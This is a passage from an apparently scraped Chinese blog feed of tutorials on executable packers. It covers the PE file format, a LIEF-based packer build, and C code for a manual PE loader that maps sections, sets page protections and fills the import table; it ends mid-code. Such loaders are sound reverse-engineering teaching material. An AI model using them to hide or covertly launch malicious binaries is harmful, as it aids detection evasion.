\u0026lt;SHARED | STATIC\u0026gt; - Default: STATIC add_executable(packer packer.cpp)if(MSVC)\ttarget_compile_options(packer PRIVATE /FIiso646.h /MT)\tset_property(TARGET packer PROPERTY LINK_FLAGS /NODEFAULTLIB:MSVCRT)endif()target_include_directories(packer PRIVATE ${LIEF_INCLUDE_DIRS})set_property(TARGET packer PROPERTY CXX_STANDARD 11 PROPERTY CXX_STANDARD_REQUIRED ON)target_link_libraries(packer PRIVATE ${LIEF_LIBRARIES})  我要顺便一提，LIEF有python包，但那玩意儿不知道为啥赋值content一直报 not supported，没解决。就干脆拿 c++ 写了。论简单快捷还是要看 python 版本的。\n结论 加壳程序反而平平无奇，正印证了那句台下功夫。\n","date":"2021-09-28T16:57:00+08:00","image":"https://nnnewb.github.io/blog/p/learning-packer-02/cover_hu8b7651a2bda3b235d3ed49f67a1e20bd_99156_120x120_fill_q75_box_smart1.jpg","permalink":"https://nnnewb.github.io/blog/p/learning-packer-02/","title":"加壳原理02 - 简单加壳机"},{"content":"前言 本文由多篇相关文章翻译整合得来，参考文章和书目文末给出。\n0x01 PE文件结构 1.1 从 PE-COFF 格式说起  \u0026hellip; 现在PC平台流行的 可执行文件格式（Executable） 主要是 Windows 下的 PE （Portable Executable） 和 Linux 的 ELF （Executable Linkable Format），它们都是 COFF（Common Object File Format）格式的变种。目标文件就是源代码编译后但未进行链接的那些中间文件（Windows 的 .obj 和 Linux 下的 .o），它和可执行文件的内容和结构很相似，所以一般跟可执行文件一起采用一种格式存储。从广义上看，目标文件与可执行文件的格式其实几乎是一样的，所以我们可以广义地将目标文件与可执行文件看成是同一种类型的文件，在 Windows 下，我们可以统称它们为 PE-COFF 文件格式。在 Linux 下，我们可以将它们统称为 ELF 文件。\n\u0026hellip; 不光是 可执行文件 （Windows 的 .exe 和 Linux 下的 ELF 可执行文件）按照可执行文件格式存储。动态链接库（DLL，Dynamic Linking Library） （Windows 的 DLL 和 Linux 下的 .so ）以及静态链接库 （Static Linking Library） （Windows 的 .lib 和 Linux 下的 .a）文件都按照可执行文件格式存储。它们在 Windows 下都按照 PE-COFF 格式存储，Linux 下按照 ELF 格式存储。静态链接库稍有不同，它是把很多目标文件捆绑在一起形成一个文件，再加上一些索引，可以简单理解为一个包含很多目标文件的文件包。\n\u0026hellip; COFF 的主要贡献是在目标文件引入了“段”的机制，不同的目标文件可以拥有不同数量及不同类型的“段”。另外，它还定义了调试数据的格式。\n——《程序员的自我修养——链接、装载与库》\n 这里讨论可执行文件格式，目标文件、静态库、动态库都先暂时不考虑。btw，引文中的“段”其实说的既是Section也是Segment，根据上下文自己理解。\n1.2 PE 文件头一览 PE格式在 Wiki 上有张挺漂亮的图。\n图中可以看到，微软的兼容包袱是真的重（不是）。\nPE文件头已经包含了海量的信息，大部分我们不关注（或者说很少关注？），从做个简单壳的目的出发，了解了PE-COFF格式的一点通识和历史后就可以继续了。\n读懂这图需要了解下关于PE文件中几种“地址”的概念：\n raw addresses，或者文件偏移 file offset，这种地址指的是 PE 文件中的偏移。 virtual addresses，虚拟地址，指在 RAM 中的地址，就是一般常说的进程地址空间里的地址。 relative virtual addresses，相对镜像基址（Image Base）的虚拟地址，不考虑 ASLR 的情况下，相对地址计算就是基址+RVA。  可以理解成，VA 就是基址+RVA，RVA就是VA-基址。\nVA/RVA 转文件偏移就麻烦很多，要根据节表 Section Table 计算。\n上述镜像基址 Image Base 和节表 Section Table 都可以在图里找到。\n1.3 DOS 文件头 我们可以用在 Python REPL 中用 pefile 来快速分析和查看PE文件。\n1 2 3  import pefile pe = pefile.PE(\u0026#39;cm04.exe\u0026#39;) # cm04 是C++写的带界面 Hello world，你也可以用计算器，C:\\Windows\\System32\\calc.exe print(pe.DOS_HEADERS)   结果如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  [IMAGE_DOS_HEADER] 0x0 0x0 e_magic: 0x5A4D 0x2 0x2 e_cblp: 0x90 0x4 0x4 e_cp: 0x3 0x6 0x6 e_crlc: 0x0 0x8 0x8 e_cparhdr: 0x4 0xA 0xA e_minalloc: 0x0 0xC 0xC e_maxalloc: 0xFFFF 0xE 0xE e_ss: 0x0 0x10 0x10 e_sp: 0xB8 0x12 0x12 e_csum: 0x0 0x14 0x14 e_ip: 0x0 0x16 0x16 e_cs: 0x0 0x18 0x18 e_lfarlc: 0x40 0x1A 0x1A e_ovno: 0x0 0x1C 0x1C e_res: 0x24 0x24 e_oemid: 0x0 0x26 0x26 e_oeminfo: 0x0 0x28 0x28 e_res2: 0x3C 0x3C e_lfanew: 0x108   第一列是文件偏移，第二列是结构内的相对偏移，第三列是字段名，第四列是值。\nDOS文件头里基本都是为兼容保留的字段，没有我们需要的信息。需要关注的主要是开头的e_magic，固定为0x5A4D，也就是ASCII编码的MZ；还有末尾的e_lfanew，这个字段保存的是NT文件头的文件偏移，对照上文的图片，就是绿色 COFF Header 开头的 Signature。\n1.4 NT/File/COFF 文件头 这部分开始，数据结构定义和上文中的PE文件头图有点差异（主要是字段划分归类上），编程的时候按实际数据结构写，看理论的时候遵照文档说法来灵活理解吧。之后C结构定义在字段归类上也有点差别的。总之，参考字段大小顺序，别太在意结构怎么写的。\n用 print(pe.NT_HEADERS) 可以看到只输出了一个 Signature。剩余的 COFF Header 可以用 pe.FILE_HEADER 查看（在微软 PE Format 文档中，Signature 不是 COFF File Header 的组成部分，和 Wiki 的图不一致）。\n1 2 3 4 5 6 7 8 9  In [4]: print(pe.FILE_HEADER) [IMAGE_FILE_HEADER] 0x10C 0x0 Machine: 0x14C 0x10E 0x2 NumberOfSections: 0x7 0x110 0x4 TimeDateStamp: 0x61501513 [Sun Sep 26 06:37:07 2021 UTC] 0x114 0x8 PointerToSymbolTable: 0x0 0x118 0xC NumberOfSymbols: 0x0 0x11C 0x10 SizeOfOptionalHeader: 0xE0 0x11E 0x12 Characteristics: 0x102   在这部分文件头中有几个重要字段：NumberOfSections，PE文件中节的数量；以及 Characteristics，16比特标志位字段，标识PE文件的一些基本属性。可用的属性清单链接。\n1.5 可选文件头 虽然叫可选文件头（Optional Header），但并不可选。可以照例输出看看。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  In [5]: print(pe.OPTIONAL_HEADER) [IMAGE_OPTIONAL_HEADER] 0x120 0x0 Magic: 0x10B 0x122 0x2 MajorLinkerVersion: 0xE 0x123 0x3 MinorLinkerVersion: 0x1D 0x124 0x4 SizeOfCode: 0x6800 0x128 0x8 SizeOfInitializedData: 0xD000 0x12C 0xC SizeOfUninitializedData: 0x0 0x130 0x10 AddressOfEntryPoint: 0x1005 0x134 0x14 BaseOfCode: 0x1000 0x138 0x18 BaseOfData: 0x8000 0x13C 0x1C ImageBase: 0x400000 0x140 0x20 SectionAlignment: 0x1000 0x144 0x24 FileAlignment: 0x200 0x148 0x28 MajorOperatingSystemVersion: 0x6 0x14A 0x2A MinorOperatingSystemVersion: 0x0 0x14C 0x2C MajorImageVersion: 0x0 0x14E 0x2E MinorImageVersion: 0x0 0x150 0x30 MajorSubsystemVersion: 0x6 0x152 0x32 MinorSubsystemVersion: 0x0 0x154 0x34 Reserved1: 0x0 0x158 0x38 SizeOfImage: 0x19000 0x15C 0x3C SizeOfHeaders: 0x400 0x160 0x40 CheckSum: 0x0 0x164 0x44 Subsystem: 0x2 0x166 0x46 DllCharacteristics: 0x8140 0x168 0x48 SizeOfStackReserve: 0x100000 0x16C 0x4C SizeOfStackCommit: 0x1000 0x170 0x50 SizeOfHeapReserve: 0x100000 0x174 0x54 SizeOfHeapCommit: 0x1000 0x178 0x58 LoaderFlags: 0x0 0x17C 0x5C NumberOfRvaAndSizes: 0x10   其中大部分字段要不然是没用到，要不然就是固定值不变。几个值得关注的字段如下。\n Magic，区分 PE32/PE64 格式。微软文档给出的是 0x10b 对应 PE32，0x20b 对应 PE32+。 AddressOfEntryPoint，二进制文件加载后要执行的第一条指令的地址，程序的入口点，注意是RVA。 ImageBase，偏好的镜像基址。RVA和这个基址相加得到VA。注意因为ASLR的存在，真实基址在运行前并不确定。 SizeOfImage，镜像的 虚拟大小 ，是加载可执行文件到内存时需要申请的内存大小。 SizeOfHeaders，所有文件头（DOS、NT、COFF、Optional \u0026hellip;）的总大小。 DLLCharacteristics，各种标志位，最有用的是IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE ，指定镜像基址是否可移动（也就是能不能开启ASLR 基址随机化）。  0x02 加载PE 对PE格式有了基本了解后，就可以开始尝试加载 PE 文件到内存里了。\n2.1 加载和内存初始化 PE文件头总是加载到镜像基址处。先写一个简单的C程序，把 PE 文件读取。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;Windows.h\u0026gt;#include \u0026lt;winnt.h\u0026gt; int main(int argc, char const *argv[]) { if (argc \u0026lt; 2) { printf(\u0026#34;missing path argument\\n\u0026#34;); return 1; } FILE *exe_file = fopen(argv[1], \u0026#34;rb\u0026#34;); if (!exe_file) { printf(\u0026#34;error opening file\\n\u0026#34;); return 1; } // Get file size : put pointer at the end  fseek(exe_file, 0L, SEEK_END); // and read its position  long int file_size = ftell(exe_file); // put the pointer back at the beginning  fseek(exe_file, 0L, SEEK_SET); // allocate memory and read the whole file  char *exe_file_data = malloc(file_size + 1); // read whole file  size_t n_read = fread(exe_file_data, 1, file_size, exe_file); if (n_read != file_size) { printf(\u0026#34;reading error (%d)\\n\u0026#34;, n_read); return 1; } // load the PE in memory  printf(\u0026#34;[+] Loading PE file\\n\u0026#34;); return 0; }   先写这么多，内容只有简单地文件IO，读取PE文件到内存，接下来写一个 void* load_PE(char* PE_data) 函数，加载PE文件内容到内存空间，返回加载后的镜像基址。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  void *load_PE(char *PE_data) { IMAGE_DOS_HEADER *p_DOS_header = (IMAGE_DOS_HEADER *)PE_data; IMAGE_NT_HEADERS *p_NT_headers = (IMAGE_NT_HEADERS *)(PE_data + p_DOS_header-\u0026gt;e_lfanew); // extract information from PE header  DWORD size_of_image = p_NT_headers-\u0026gt;OptionalHeader.SizeOfImage; DWORD entry_point_RVA = p_NT_headers-\u0026gt;OptionalHeader.AddressOfEntryPoint; DWORD size_of_headers = p_NT_headers-\u0026gt;OptionalHeader.SizeOfHeaders; // allocate memory  // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc  char *p_image_base = (char *)VirtualAlloc(NULL, size_of_image, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE); if (p_image_base == NULL) { return NULL; } // copy PE headers in memory  memcpy(p_image_base, PE_data, size_of_headers); // Section headers starts right after the IMAGE_NT_HEADERS struct, so we do some pointer arithmetic-fu here.  IMAGE_SECTION_HEADER *sections = (IMAGE_SECTION_HEADER *)(p_NT_headers + 1); for (int i = 0; i \u0026lt; p_NT_headers-\u0026gt;FileHeader.NumberOfSections; i++) { // calculate the VA we need to copy the content, from the RVA  // section[i].VirtualAddress is a RVA, mind it  char *dest = p_image_base + sections[i].VirtualAddress; // check if there is Raw data to copy  if (sections[i].SizeOfRawData \u0026gt; 0) { // We copy SizeOfRaw data bytes, from the offset PointerToRawData in the file  memcpy(dest, PE_data + sections[i].PointerToRawData, sections[i].SizeOfRawData); } else { memset(dest, 0, sections[i].Misc.VirtualSize); } } return p_image_base; }   前几句赋值都是在用指针运算取PE文件头里的字段。\n1 2 3 4 5 6 7  IMAGE_DOS_HEADER *p_DOS_header = (IMAGE_DOS_HEADER *)PE_data; IMAGE_NT_HEADERS *p_NT_headers = (IMAGE_NT_HEADERS *)(PE_data + p_DOS_header-\u0026gt;e_lfanew); // extract information from PE header  DWORD size_of_image = p_NT_headers-\u0026gt;OptionalHeader.SizeOfImage; DWORD entry_point_RVA = p_NT_headers-\u0026gt;OptionalHeader.AddressOfEntryPoint; DWORD size_of_headers = p_NT_headers-\u0026gt;OptionalHeader.SizeOfHeaders;   先提取了 DOS 文件头和 NT 文件头（注意， File Header 和 Optional Header 都嵌在 NT 文件头结构里，这就是为啥我说结构定义会和上面的 wiki 图不大一样）。接着从文件头结构里取镜像大小、入口点RVA、文件头总大小，用于后续分配内存和指针运算。\n1 2 3 4 5 6  // allocate memory  // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc  char *p_image_base = (char *)VirtualAlloc(NULL, size_of_image, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE); if (p_image_base == NULL) { return NULL; }   紧接着用 Win32 API 分配了一片内存空间，大小由 PE 文件头的镜像大小指定。用这个API的原因是之后我们需要设置这片内存为可执行。\n1 2  // copy PE headers in memory  memcpy(p_image_base, PE_data, size_of_headers);   PE文件头总是在镜像基址开始的位置，直接复制过去。\n1 2  // Section headers starts right after the IMAGE_NT_HEADERS struct, so we do some pointer arithmetic-fu here.  IMAGE_SECTION_HEADER *sections = (IMAGE_SECTION_HEADER *)(p_NT_headers + 1);   取巧的方式获得节表指针。这是个简单的c指针运算，p_NT_headers+1其实就是(char*)p_NT_headers + sizeof(IMAGE_NT_HEADERS)，也就是NT_HEADERS 结构紧邻的下一个字节。\n1 2 3 4 5 6 7 8 9 10 11 12 13  for (int i = 0; i \u0026lt; p_NT_headers-\u0026gt;FileHeader.NumberOfSections; i++) { // calculate the VA we need to copy the content, from the RVA  // section[i].VirtualAddress is a RVA, mind it  char *dest = p_image_base + sections[i].VirtualAddress; // check if there is Raw data to copy  if (sections[i].SizeOfRawData \u0026gt; 0) { // We copy SizeOfRaw data bytes, from the offset PointerToRawData in the file  memcpy(dest, PE_data + sections[i].PointerToRawData, sections[i].SizeOfRawData); } else { memset(dest, 0, sections[i].Misc.VirtualSize); } }   接着就是遍历节表，取节的基地址，PE文件中节包含数据的话，就复制节数据到内存，否则把节初始化为0。\n接着补充可执行权限。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  // Set permission for the PE hader to read only  DWORD oldProtect; VirtualProtect(p_image_base, p_NT_headers-\u0026gt;OptionalHeader.SizeOfHeaders, PAGE_READONLY, \u0026amp;oldProtect); for (int i = 0; i \u0026lt; p_NT_headers-\u0026gt;FileHeader.NumberOfSections; ++i) { char *dest = p_image_base + sections[i].VirtualAddress; DWORD s_perm = sections[i].Characteristics; DWORD v_perm = 0; // flags are not the same between virtal protect and the section header  if (s_perm \u0026amp; IMAGE_SCN_MEM_EXECUTE) { v_perm = (s_perm \u0026amp; IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ; } else { v_perm = (s_perm \u0026amp; IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY; } VirtualProtect(dest, sections[i].Misc.VirtualSize, v_perm, \u0026amp;oldProtect); }   先把整个PE头设置为只读，然后遍历节表，取节基地址和标志位。\n1 2 3  if (s_perm \u0026amp; IMAGE_SCN_MEM_EXECUTE) { v_perm = (s_perm \u0026amp; IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ; }   根据PE头中节的可写、可执行标志位，设置内存空间保护方式。\n最后返回入口点地址，在 main 函数里跳转。\n1  return (void *)(p_image_base + entry_point_RVA);   完整代码如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96  #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;Windows.h\u0026gt;#include \u0026lt;winnt.h\u0026gt; int main(int argc, char const *argv[]) { if (argc \u0026lt; 2) { printf(\u0026#34;missing path argument\\n\u0026#34;); return 1; } FILE *exe_file = fopen(argv[1], \u0026#34;rb\u0026#34;); if (!exe_file) { printf(\u0026#34;error opening file\\n\u0026#34;); return 1; } // Get file size : put pointer at the end  fseek(exe_file, 0L, SEEK_END); // and read its position  long int file_size = ftell(exe_file); // put the pointer back at the beginning  fseek(exe_file, 0L, SEEK_SET); // allocate memory and read the whole file  char *exe_file_data = malloc(file_size + 1); // read whole file  size_t n_read = fread(exe_file_data, 1, file_size, exe_file); if (n_read != file_size) { printf(\u0026#34;reading error (%d)\\n\u0026#34;, n_read); return 1; } // load the PE in memory  printf(\u0026#34;[+] Loading PE file\\n\u0026#34;); return 0; } void *load_PE(char *PE_data) { IMAGE_DOS_HEADER *p_DOS_header = (IMAGE_DOS_HEADER *)PE_data; IMAGE_NT_HEADERS *p_NT_headers = (IMAGE_NT_HEADERS *)(PE_data + p_DOS_header-\u0026gt;e_lfanew); // extract information from PE header  DWORD size_of_image = p_NT_headers-\u0026gt;OptionalHeader.SizeOfImage; DWORD entry_point_RVA = p_NT_headers-\u0026gt;OptionalHeader.AddressOfEntryPoint; DWORD size_of_headers = p_NT_headers-\u0026gt;OptionalHeader.SizeOfHeaders; // allocate memory  // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc  char *p_image_base = (char *)VirtualAlloc(NULL, size_of_image, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE); if (p_image_base == NULL) { return NULL; } // copy PE headers in memory  memcpy(p_image_base, PE_data, size_of_headers); // Section headers starts right after the IMAGE_NT_HEADERS struct, so we do some pointer arithmetic-fu here.  IMAGE_SECTION_HEADER *sections = (IMAGE_SECTION_HEADER *)(p_NT_headers + 1); for (int i = 0; i \u0026lt; p_NT_headers-\u0026gt;FileHeader.NumberOfSections; i++) { // calculate the VA we need to copy the content, from the RVA  // section[i].VirtualAddress is a RVA, mind it  char *dest = p_image_base + sections[i].VirtualAddress; // check if there is Raw data to copy  if (sections[i].SizeOfRawData \u0026gt; 0) { // We copy SizeOfRaw data bytes, from the offset PointerToRawData in the file  memcpy(dest, PE_data + sections[i].PointerToRawData, sections[i].SizeOfRawData); } else { memset(dest, 0, sections[i].Misc.VirtualSize); } } // Set permission for the PE hader to read only  DWORD oldProtect; VirtualProtect(p_image_base, p_NT_headers-\u0026gt;OptionalHeader.SizeOfHeaders, PAGE_READONLY, \u0026amp;oldProtect); for (int i = 0; i \u0026lt; p_NT_headers-\u0026gt;FileHeader.NumberOfSections; ++i) { char *dest = p_image_base + sections[i].VirtualAddress; DWORD s_perm = sections[i].Characteristics; DWORD v_perm = 0; // flags are not the same between virtal protect and the section header  if (s_perm \u0026amp; IMAGE_SCN_MEM_EXECUTE) { v_perm = (s_perm \u0026amp; IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ; } else { v_perm = (s_perm \u0026amp; IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY; } VirtualProtect(dest, sections[i].Misc.VirtualSize, v_perm, \u0026amp;oldProtect); } return (void *)(p_image_base + entry_point_RVA); }   到此，看起来这个加载其他程序运行的程序可以运行了，但其实还不行。其主要原因之一就是缺乏必要的导入信息。下文详述。\n0x03 导入表 3.1 导入表介绍 在Windows上，每个可执行文件（.exe）都需要一些外部函数来支持其正常运作。这些外部函数通常在我们熟悉的.dll文件里。举例来说，calc.exe（计算器程序）需要外部函数来支持打开窗口、显示按钮等。\n以ShellExecuteW为例（在calc.exe计算器中被导入），calc.exe需要这个函数来支持它正常工作（当然，calc.exe需要不止这一个外部函数），所以calc.exe需要知道ShellExecuteW这个函数的代码（机器码）在哪儿。\n但事实上，.dll 只会在运行时被加载，而且加载后在内存中的位置并不确定。这意味着编译器编译时无从得知ShellExecuteW的地址（开启ASLR的话就更不可能了），也就无法给调用该函数的call指令提供正确的立即数地址。\n这就是为什么编译器要创建导入表，因为它期望一旦动态链接库加载完成，它就可以查找到ShellExecuteW的地址，并在需要的时候调用。\n在调试器里，我们可以看到这样的汇编指令。\n第一条call指令是内部调用，调用对象是同一个模块内的函数。编译器知道被调用函数的地址，并使用E8 opcode 。这表示 relative call 。当调用外部模块时，它调用了从IAT读取的地址，也就是图中ds:[\u0026lt;\u0026amp;ShellExecuteW\u0026gt;]。\nx86 的 call 分 4 类。\n Near, relative (opcode E8) (call func) Far, absolute (opcode 9A) (call 0x12:0x12345678) Near, absolute, indirect (opcode FF /2) (call [edi]) Far, absolute, indirect (opcode FF /3) (call far [edi])  具体问搜索引擎。\n补充，函数可以通过名字（ASCII编码的C字符串）或DLL导出表中的序号 ordinal 导入。\n3.2 Data Directory 和 IDT 说了这么多IAT，那么IAT到底在哪儿？以什么形式保存？还是用pefile，先看看 PE 文件头中的 OPTIONAL_HEADER .DATA_DIRECTORY。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  In [10]: pe.OPTIONAL_HEADER.DATA_DIRECTORY Out[10]: [\u0026lt;Structure: [IMAGE_DIRECTORY_ENTRY_EXPORT] 0x180 0x0 VirtualAddress: 0x0 0x184 0x4 Size: 0x0\u0026gt;, \u0026lt;Structure: [IMAGE_DIRECTORY_ENTRY_IMPORT] 0x188 0x0 VirtualAddress: 0xDAA0 0x18C 0x4 Size: 0xC8\u0026gt;, \u0026lt;Structure: [IMAGE_DIRECTORY_ENTRY_RESOURCE] 0x190 0x0 VirtualAddress: 0x16000 0x194 0x4 Size: 0x5D0\u0026gt;, \u0026lt;Structure: [IMAGE_DIRECTORY_ENTRY_EXCEPTION] 0x198 0x0 VirtualAddress: 0x0 0x19C 0x4 Size: 0x0\u0026gt;, \u0026lt;Structure: [IMAGE_DIRECTORY_ENTRY_SECURITY] 0x1A0 0x0 VirtualAddress: 0x0 0x1A4 0x4 Size: 0x0\u0026gt;, \u0026lt;Structure: [IMAGE_DIRECTORY_ENTRY_BASERELOC] 0x1A8 0x0 VirtualAddress: 0x17000 0x1AC 0x4 Size: 0xE0C\u0026gt;, \u0026lt;Structure: [IMAGE_DIRECTORY_ENTRY_DEBUG] 0x1B0 0x0 VirtualAddress: 0x98E0 0x1B4 0x4 Size: 0x38\u0026gt;, \u0026lt;Structure: [IMAGE_DIRECTORY_ENTRY_COPYRIGHT] 0x1B8 0x0 VirtualAddress: 0x0 0x1BC 0x4 Size: 0x0\u0026gt;, \u0026lt;Structure: [IMAGE_DIRECTORY_ENTRY_GLOBALPTR] 0x1C0 0x0 VirtualAddress: 0x0 0x1C4 0x4 Size: 0x0\u0026gt;, \u0026lt;Structure: [IMAGE_DIRECTORY_ENTRY_TLS] 0x1C8 0x0 VirtualAddress: 0x0 0x1CC 0x4 Size: 0x0\u0026gt;, \u0026lt;Structure: [IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG] 0x1D0 0x0 VirtualAddress: 0x9918 0x1D4 0x4 Size: 0x40\u0026gt;, \u0026lt;Structure: [IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT] 0x1D8 0x0 VirtualAddress: 0x0 0x1DC 0x4 Size: 0x0\u0026gt;, \u0026lt;Structure: [IMAGE_DIRECTORY_ENTRY_IAT] 0x1E0 0x0 VirtualAddress: 0xD000 0x1E4 0x4 Size: 0xAA0\u0026gt;, \u0026lt;Structure: [IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT] 0x1E8 0x0 VirtualAddress: 0x0 0x1EC 0x4 Size: 0x0\u0026gt;, \u0026lt;Structure: [IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR] 0x1F0 0x0 VirtualAddress: 0x0 0x1F4 0x4 Size: 0x0\u0026gt;, \u0026lt;Structure: [IMAGE_DIRECTORY_ENTRY_RESERVED] 0x1F8 0x0 VirtualAddress: 0x0 0x1FC 0x4 Size: 0x0\u0026gt;]   Data directory 实际就是15个结构组成的数组（忽略最后一个reserved），每个结构包含对应的RVA地址和大小（RVA和大小的具体含义之后讨论）。这个结构里我们关注的有IMAGE_DIRECTORY_ENTRY_IMPORT和IMAGE_DIRECTORY_ENTRY_IAT，分别指向的是 Import Directory Table ，IDT ，和 Import Address Table ， IAT 。\n基本是，我们可以这么说， IDT 指示需要导入哪些函数，这些函数导入后，地址存入 IAT 。 IDT 是我们要导入什么， IAT 是我们导入后把地址放在哪儿。\nImport Directory 指向的是一个 NULL 结尾的IMAGE_IMPORT_DESCRIPTOR结构数组。之后在代码里会用到。\n1 2 3 4 5 6 7 8 9 10  typedef struct _IMAGE_IMPORT_DESCRIPTOR { _ANONYMOUS_UNION union { DWORD Characteristics; DWORD OriginalFirstThunk; // pointer to dword[]  } DUMMYUNIONNAME; DWORD TimeDateStamp; DWORD ForwarderChain; DWORD Name; // pointer to dll name  DWORD FirstThunk; // pointer to dword[] } IMAGE_IMPORT_DESCRIPTOR, *PIMAGE_IMPORT_DESCRIPTOR;   OriginalFirstThunk 和 FirstThunk 都是指向一个 NULL 结尾的 DWORD 数组。OriginalFirstThunk 是指向 IDT DWORD 数组的 RVA 指针。\n其中数组元素：\n 如果首比特是1，则这个DWORD是 ordinal ，函数的导出表序号。 否则是指向 IMAGE_IMPORT_BY_NAME 结构的 RVA 地址。  FirstThunk指向的是 IAT ，和 IDT 结构相同，当我们得到导入函数的地址后，需要把地址放进 IDT 对应的 IAT 中。\n3.3 填充导入表 下面实际编写一下填充 IAT 的代码。要注意填充 IAT 的代码必须在加载 PE 头和 Sections 之后，早于设置内存保护执行。\n1 2 3 4 5  IMAGE_DATA_DIRECTORY *data_directory = p_NT_headers-\u0026gt;OptionalHeader.DataDirectory; // load the address of the import descriptors array  IMAGE_IMPORT_DESCRIPTOR *import_descriptors = (IMAGE_IMPORT_DESCRIPTOR *)(p_image_base + data_directory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);   从文件头提取到 Import Directory 的地址（RVA）后，和镜像基址相加算出实际结构地址。接下来开始遍历这个结构。\n1 2  // this array is null terminated  for (int i = 0; import_descriptors[i].OriginalFirstThunk != 0; ++i) {   注意此处所说的 null terminated 指的是最后一个数组元素填充了0，故用 OriginalFirstThunk 判断。\n1 2 3 4 5 6 7  // Get the name of the dll, and import it char *module_name = p_image_base + import_descriptors[i].Name; HMODULE import_module = LoadLibraryA(module_name); if (import_module == NULL) { printf(\u0026#34;import module is null\u0026#34;); abort(); }   import_descriptors[i].Name 依然是一个 RVA，指向常量字符串。在这一步之前必须先完成 section 加载，不然取不到字符串。这里用 LoadLibraryA 加载了 DLL 到内存。\n1 2  // the lookup table points to function names or ordinals =\u0026gt; it is the IDT IMAGE_THUNK_DATA *lookup_table = (IMAGE_THUNK_DATA *)(p_image_base + import_descriptors[i].OriginalFirstThunk);   接着取 OriginalFirstThunk 转为 IMAGE_THUNK_DATA 指针，这就是 IDT 了。\n1 2 3  // the address table is a copy of the lookup table at first // but we put the addresses of the loaded function inside =\u0026gt; that\u0026#39;s the IAT IMAGE_THUNK_DATA *address_table = (IMAGE_THUNK_DATA *)(p_image_base + import_descriptors[i].FirstThunk);   再取 FirstThunk 转为 IMAGE_THUNK_DATA 指针，这是 IAT，之后加载的函数地址会存放到这里。\n1 2  // null terminated array, again for (int i = 0; lookup_table[i].u1.AddressOfData != 0; ++i)   然后遍历 IDT ，和遍历 import_descriptors 时一样，注意 null terminated 指的是最后一个元素用0填充。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  void *function_handle = NULL; // Check the lookup table for the adresse of the function name to import DWORD lookup_addr = lookup_table[i].u1.AddressOfData; if ((lookup_addr \u0026amp; IMAGE_ORDINAL_FLAG) == 0) { // if first bit is not 1  // import by name : get the IMAGE_IMPORT_BY_NAME struct  IMAGE_IMPORT_BY_NAME *image_import = (IMAGE_IMPORT_BY_NAME *)(p_image_base + lookup_addr); // this struct points to the ASCII function name  char *funct_name = (char *)\u0026amp;(image_import-\u0026gt;Name); // get that function address from it\u0026#39;s module and name  function_handle = (void *)GetProcAddress(import_module, funct_name); } else { // import by ordinal, directly  function_handle = (void *)GetProcAddress(import_module, (LPSTR)lookup_addr); } if (function_handle == NULL) { printf(\u0026#34;function handle is null\u0026#34;); abort(); } // change the IAT, and put the function address inside. address_table[i].u1.Function = (DWORD)function_handle;   对每个 IDT 元素，根据 IDT 中保存的元素确定加载方式（字符串或者 ordinal），调用 GetProcAddress 加载后的地址存入 IAT 。\n至此，IAT 填充完成。\n完整代码如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53  void fix_iat(char *p_image_base, IMAGE_NT_HEADERS *p_NT_headers) { IMAGE_DATA_DIRECTORY *data_directory = p_NT_headers-\u0026gt;OptionalHeader.DataDirectory; // load the address of the import descriptors array  IMAGE_IMPORT_DESCRIPTOR *import_descriptors = (IMAGE_IMPORT_DESCRIPTOR *)(p_image_base + data_directory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); // this array is null terminated  for (int i = 0; import_descriptors[i].OriginalFirstThunk != 0; ++i) { // Get the name of the dll, and import it  char *module_name = p_image_base + import_descriptors[i].Name; HMODULE import_module = LoadLibraryA(module_name); if (import_module == NULL) { printf(\u0026#34;import module is null\u0026#34;); abort(); } // the lookup table points to function names or ordinals =\u0026gt; it is the IDT  IMAGE_THUNK_DATA *lookup_table = (IMAGE_THUNK_DATA *)(p_image_base + import_descriptors[i].OriginalFirstThunk); // the address table is a copy of the lookup table at first  